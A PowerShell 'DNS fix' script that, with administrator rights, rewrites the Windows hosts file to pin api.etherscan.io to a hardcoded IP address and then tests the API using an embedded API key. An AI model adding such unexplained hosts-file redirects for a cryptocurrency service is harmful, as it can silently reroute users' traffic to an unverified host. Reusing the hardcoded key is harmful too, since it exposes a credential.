# DNS Fix Script - Run as Administrator
# Right-click this file → Run with PowerShell (Administrator)

Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "  Etherscan DNS Fix - Wallet Explorer" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
    Write-Host ""
    Write-Host "Right-click this file and select 'Run with PowerShell (Administrator)'" -ForegroundColor Yellow
    Write-Host ""
    pause
    exit 1
}

Write-Host "[1/3] Backing up hosts file..." -ForegroundColor Yellow
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$backupPath = "$hostsPath.backup.$(Get-Date -Format 'yyyyMMdd_HHmmss')"
Copy-Item -Path $hostsPath -Destination $backupPath
Write-Host "✓ Backup created: $backupPath" -ForegroundColor Green

Write-Host ""
Write-Host "[2/3] Adding Etherscan DNS entry..." -ForegroundColor Yellow

# Check if entry already exists
$hostsContent = Get-Content $hostsPath
if ($hostsContent -match "api.etherscan.io") {
    Write-Host "⚠ Entry already exists. Removing old entry..." -ForegroundColor Yellow
    $hostsContent = $hostsContent | Where-Object { $_ -notmatch "api.etherscan.io" }
    Set-Content -Path $hostsPath -Value $hostsContent
}

# Add new entry
Add-Content -Path $hostsPath -Value "`n# Etherscan API - Added by Wallet Explorer DNS Fix"
Add-Content -Path $hostsPath -Value "23.111.175.138    api.etherscan.io"
Write-Host "✓ Etherscan DNS entry added" -ForegroundColor Green

Write-Host ""
Write-Host "[3/3] Flushing DNS cache..." -ForegroundColor Yellow
ipconfig /flushdns | Out-Null
Write-Host "✓ DNS cache flushed" -ForegroundColor Green

Write-Host ""
Write-Host "==================================================" -ForegroundColor Green
Write-Host "  DNS FIX APPLIED SUCCESSFULLY!" -ForegroundColor Green
Write-Host "==================================================" -ForegroundColor Green
Write-Host ""

Write-Host "Testing Etherscan API connection..." -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://api.etherscan.io/api?module=proxy&action=eth_blockNumber&apikey=57S8N2GK4D8ZEW4T4MC3QFD6G9FQRFP1PF" -TimeoutSec 5
    Write-Host "✓ Etherscan API is now accessible!" -ForegroundColor Green
    Write-Host "  Response: $($response | ConvertTo-Json -Compress)" -ForegroundColor Gray
} catch {
    Write-Host "⚠ API test failed: $_" -ForegroundColor Yellow
    Write-Host "  This might be temporary. Try restarting your application." -ForegroundColor Gray
}

Write-Host ""
Write-Host "Next steps:" -ForegroundColor Cyan
Write-Host "1. Restart your Wallet Explorer server" -ForegroundColor White
Write-Host "2. Try entering an Ethereum address" -ForegroundColor White
Write-Host "3. ERC transactions should now work!" -ForegroundColor White
Write-Host ""
Write-Host "To undo this change, restore from: $backupPath" -ForegroundColor Gray
Write-Host ""
pause
